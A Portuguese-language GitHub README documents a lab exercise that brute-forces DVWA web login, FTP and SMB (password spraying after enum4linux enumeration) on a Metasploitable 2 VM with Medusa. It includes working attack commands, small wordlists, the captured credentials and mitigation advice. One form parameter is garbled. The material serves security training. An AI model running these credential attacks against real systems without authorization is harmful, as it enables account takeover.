🛡️ Pentest Lab: Simulação de Ataques de Força Bruta com Medusa

Este projeto documenta a implementação de um ambiente controlado para simular ataques de força bruta em diferentes serviços (Web, FTP e SMB), utilizando o Kali Linux e a ferramenta Medusa contra a máquina vulnerável Metasploitable 2.

🛠️ Configuração do Ambiente
- Atacante: Kali Linux.
- Alvo: Metasploitable 2 (DVWA, FTP, SMB).
- Rede: VirtualBox com rede interna (host-only).
- Ferramenta Principal: Medusa.

![configuracao-do-ambiente](https://github.com/adrianosalves/simulando-ataque-brute-force-de-senhas-KaliLinux/blob/main/imagens/configuracao-do-ambiente.png)

🚀 Cenário 1: Ataque em Formulário Web (DVWA)
Nesta etapa, o objetivo foi automatizar tentativas de login em um formulário web típico, simulando o preenchimento em massa com múltiplas combinações.

1. Análise Técnica do Alvo
Antes de iniciar o ataque, foi necessário entender como os dados são enviados ao servidor através da barra de desenvolvedor do navegador (F12), especificamente na aba Network.

- URL do Alvo: http://172.30.0.101/dvwa/login.php.
- Método de Envio: POST.
- Parâmetros Identificados: username, password e o botão Login.

![analise-tecnica-do-alvo-01](https://github.com/adrianosalves/simulando-ataque-brute-force-de-senhas-KaliLinux/blob/main/imagens/analise-tecnica-do-alvo-01.png)

2. Identificação da String de Erro
Para que o Medusa saiba que o login falhou, identificamos que a aplicação retorna a frase "Login failed" quando as credenciais são incorretas
. Se a resposta não contiver essa frase, a ferramenta entende que o acesso foi bem-sucedido.

![analise-tecnica-do-alvo-01](https://github.com/adrianosalves/simulando-ataque-brute-force-de-senhas-KaliLinux/blob/main/imagens/analise-tecnica-do-alvo-02.png)

3. Execução com Medusa
O comando utilizado simulou as interações que um usuário teria no navegador, mas de forma automatizada.
```
medusa -h 172.30.0.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=ÛSER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

![execucao-com-medusa](https://github.com/adrianosalves/simulando-ataque-brute-force-de-senhas-KaliLinux/blob/main/imagens/execucao-com-medusa.png)

--------------------------------------------------------------------------------
📊 Resultados e Validação
- Wordlists utilizadas: Listas simples com combinações de usuários e senhas comuns.


![Usuários](https://github.com/adrianosalves/simulando-ataque-brute-force-de-senhas-KaliLinux/blob/main/wordlists/users.txt)
```
  msfadmin
  admin
  root
```

![Senhas](https://github.com/adrianosalves/simulando-ataque-brute-force-de-senhas-KaliLinux/blob/main/wordlists/pass.txt)
```
  123456
  password
  qwerty
  msfadmin
```

- Sucesso: Descrição de qual credencial foi capturada.

usuário: 
```
  admin
```
senha:
```
  password
```

- Impacto: Se não mitigado, esse ataque pode levar ao comprometimento total do sistema, especialmente se o painelacessado for de administração ou controle de infraestrutura.

🛡️ Medidas de Mitigação
Para evitar que ataques reais ocorram, recomenda-se:
1. Políticas de Senhas Fortes: Evitar senhas curtas ou baseadas em dicionários.
2. Bloqueio de Conta (Account Lockout): Limitar o número de tentativas de login malsucedidas.
Autenticação de Dois Fatores (2FA): Adicionar uma camada extra de segurança além da senha.
3. Monitoramento: Analisar logs para identificar padrões de automação de tentativas de login em massa.

--------------------------------------------------------------------------------

📂 Cenário 2.1: Força Bruta em FTP

Este teste visa obter acesso ao serviço de transferência de arquivos da máquina Metasploitable 2.
1. Wordlists Simples: Para este teste, utilize as listas localizadas na pasta /wordlists do seu repositório:

- Usuários (users.txt): admin, user, msfadmin, root.
- Senhas (passwords.txt): 123456, password, msfadmin, admin.

2. Comando Utilizado (Medusa): O comando abaixo automatiza a tentativa de login testando todas as combinações das listas contra o alvo:
```
medusa -h 172.30.0.101 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp
```
- h: IP do alvo (Metasploitable 2).
- U/-P: Caminhos para as wordlists.
- M ftp: Módulo específico para o protocolo FTP.

3. Validação de Acesso: O sucesso é confirmado quando o Medusa exibe uma linha em verde (ou com o termo SUCCESS) indicando o par usuário/senha válido (ex: msfadmin / msfadmin). O acesso pode ser validado manualmente via terminal:
```
ftp 172.30.0.101
```
Documentar os testes: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.

--------------------------------------------------------------------------------

Cenário 2.2: Password Spraying em SMB com Enumeração
Diferente da força bruta comum, o password spraying testa uma única senha comum contra vários usuários para evitar o bloqueio de contas.

1. Enumeração de Usuários: Antes do ataque, é necessário identificar usuários válidos no serviço SMB.
```
enum4linux -a 172.30.0.101 | tee enum4_output.txt
```
Este comando extrai a lista de usuários do SAMBA da máquina alvo.

2. Wordlists:
Usuários: Utilize a lista gerada na enumeração (ex: admin, service, guest, user).
Senha Única: Uma senha fraca comum, como password123.

3. Comando Utilizado (Medusa):
```
medusa -h 172.30.0.101 -U users_found.txt -p password123 -M smbnt
```
-p: Senha única (minúsculo indica uma única string, não um arquivo).
-M smbnt: Módulo para o protocolo SMB do Windows/Samba.

4. Validação de Acesso: A validação ocorre quando o Medusa identifica qual conta de usuário aceita a senha "sprayed". O acesso pode ser testado com:
```
smbclient -L //172.30.0.101 -U [usuario_encontrado]
```
--------------------------------------------------------------------------------

📁 Estrutura do Repositório
- /images: Capturas de tela do Medusa em execução e do acesso ao DVWA.
- /wordlists: Exemplos de listas de senhas utilizadas.
- README.md: Documentação principal do projeto.
